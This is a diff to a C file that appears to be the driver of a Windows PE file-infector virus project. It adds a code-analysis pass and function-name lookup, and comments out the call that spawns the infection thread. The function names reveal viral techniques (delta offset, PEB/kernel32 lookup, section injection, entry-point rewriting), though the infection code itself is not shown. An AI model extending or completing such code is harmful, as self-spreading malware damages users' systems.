@@ -5,6 +5,7 @@
 #include "code_begin.h"
 #include "code_end.h"
 #include "delta.h"
+#include "disasm/analysis/analysis.h"
 #include "disasm/disasm.h"
 #include "function_kernel32.h"
 #include "infect.h"
@@ -24,6 +25,7 @@
     ((void *)f >= (void *)code_begin && (void *)f < (void *)code_end)
 
 static uint8_t check_functions(void);
+static const char *get_function_name(void *addr);
 
 // main function is not copied during infection, so can use any external
 // function here
@@ -36,7 +38,8 @@ int main(int argc, char **argv) {
     PRINT_DEBUG("bit_width: %d", IS_32_BIT ? 32 : IS_64_BIT ? 64 : 0);
     PRINT_DEBUG("code_begin: 0x%p", code_begin);
     PRINT_DEBUG("code_end: 0x%p", code_end);
-    PRINT_DEBUG("code_size: %.2fkiB", (float)BYTE_DIFF(code_end, code_begin) / 1024.);
+    PRINT_DEBUG("code_size: %.2fkiB",
+                (float)BYTE_DIFF(code_end, code_begin) / 1024.);
     uint8_t sane_function_locations = check_functions();
     PRINT_DEBUG("sane function locations: %s",
                 sane_function_locations ? "yes" : "no");
@@ -45,7 +48,18 @@ int main(int argc, char **argv) {
         return 2;
     }
 
-    spawn_infection_thread();
+    void *entrypoints[] = {(void *)spawn_infection_thread,
+                           (void *)infection_thread};
+
+    CodeAnalysis *analysis =
+        analyze_code(entrypoints, 2, (void *)code_begin, (void *)code_end);
+    for (FunctionList *fl = analysis->function_list; fl != NULL;
+         fl = fl->next) {
+        PRINT_DEBUG("Found function: 0x%p -> %s", fl->function->entrypoint,
+                    get_function_name(fl->function->entrypoint));
+    }
+
+    // spawn_infection_thread();
     fgetc(stdin);
     return 0;
 }
@@ -54,6 +68,7 @@ static uint8_t check_functions(void) {
     return !IN_BOUNDARIES(main) && !IN_BOUNDARIES(check_functions) &&
            IN_BOUNDARIES(get_string) && IN_BOUNDARIES(get_string_length) &&
            IN_BOUNDARIES(checksum) && IN_BOUNDARIES(spawn_infection_thread) &&
+		   IN_BOUNDARIES(infect) &&
            IN_BOUNDARIES(get_original_entry_point) &&
            IN_BOUNDARIES(write_original_entry_point) && IN_BOUNDARIES(is_pe) &&
            IN_BOUNDARIES(align_value) && IN_BOUNDARIES(get_nt_header) &&
@@ -66,4 +81,53 @@ static uint8_t check_functions(void) {
            IN_BOUNDARIES(get_kernel32_base) &&
            IN_BOUNDARIES(get_delta_offset) && IN_BOUNDARIES(memzero) &&
            IN_BOUNDARIES(memcp) && IN_BOUNDARIES(same_case_insensitive);
+}
+
+static const char *get_function_name(void *addr) {
+    if (addr == get_string)
+        return "get_string";
+    else if (addr == get_string_length)
+        return "get_string_length";
+    else if (addr == infect)
+        return "infect";
+    else if (addr == checksum)
+        return "checksum";
+    else if (addr == spawn_infection_thread)
+        return "spawn_infection_thread";
+    else if (addr == get_original_entry_point)
+        return "get_original_entry_point";
+    else if (addr == write_original_entry_point)
+        return "write_original_entry_point";
+    else if (addr == is_pe)
+        return "is_pe";
+    else if (addr == align_value)
+        return "align_value";
+    else if (addr == get_section_header)
+        return "get_section_header";
+    else if (addr == get_last_section_header)
+        return "get_last_section_header";
+    else if (addr == get_export_directory)
+        return "get_export_directory";
+    else if (addr == is_section_header_empty)
+        return "is_section_header_empty";
+    else if (addr == create_section_header)
+        return "create_section_header";
+    else if (addr == get_teb)
+        return "get_teb";
+    else if (addr == get_peb)
+        return "get_peb";
+    else if (addr == get_image_base)
+        return "get_image_base";
+    else if (addr == get_kernel32_base)
+        return "get_kernel32_base";
+    else if (addr == get_delta_offset)
+        return "get_delta_offset";
+    else if (addr == memzero)
+        return "memzero";
+    else if (addr == memcp)
+        return "memcp";
+    else if (addr == same_case_insensitive)
+        return "same_case_insensitive";
+    else
+        return "<UNKNOWN>";
 }
